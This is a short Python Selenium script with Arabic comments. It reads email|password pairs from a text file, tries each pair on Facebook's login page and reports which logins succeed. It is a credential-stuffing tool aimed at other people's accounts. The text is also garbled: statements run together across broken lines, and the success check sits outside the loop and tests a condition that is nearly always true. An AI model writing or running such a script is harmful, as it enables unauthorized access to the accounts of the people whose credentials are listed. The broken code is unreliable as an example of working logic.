from selenium import webdriver from selenium.webdriver.common.keys 
import Keys import time
# قراءة الأزواج من ملف النص
with open("kkk.txt", "r") as file: credentials_list = 
    [line.strip().split("|") for line in file]
# قم بإنشاء متصفح WebDriver
driver = webdriver.Firefox() for email, password in 
credentials_list:
    # افتح صفحة تسجيل الدخول إلى Facebook
    driver.get("https://www.facebook.com/") time.sleep(1)
    # قم بإدخال عنوان البريد الإلكتروني وكلمة المرور
    driver.find_element_by_name("email").send_keys(email) 
    driver.find_element_by_name("pass").send_keys(password)
    # انقر فوق زر تسجيل الدخول
    driver.find_element_by_name("login").click() time.sleep(2) # 
    انتظر قليلاً للسماح بتحميل الصفحة
    # تحقق مما إذا كان المستخدم قد تم تسجيل الدخول بنجاح
if "facebook.com" in driver.current_url:
    print("تم تسجيل الدخول بنجاح للحساب: {}".format(email))
    # يمكنك أيضًا إضافة إجراءات إضافية بمجرد تسجيل الدخول بنجاح
else:
    print("فشل تسجيل الدخول للحساب: {}".format(email))
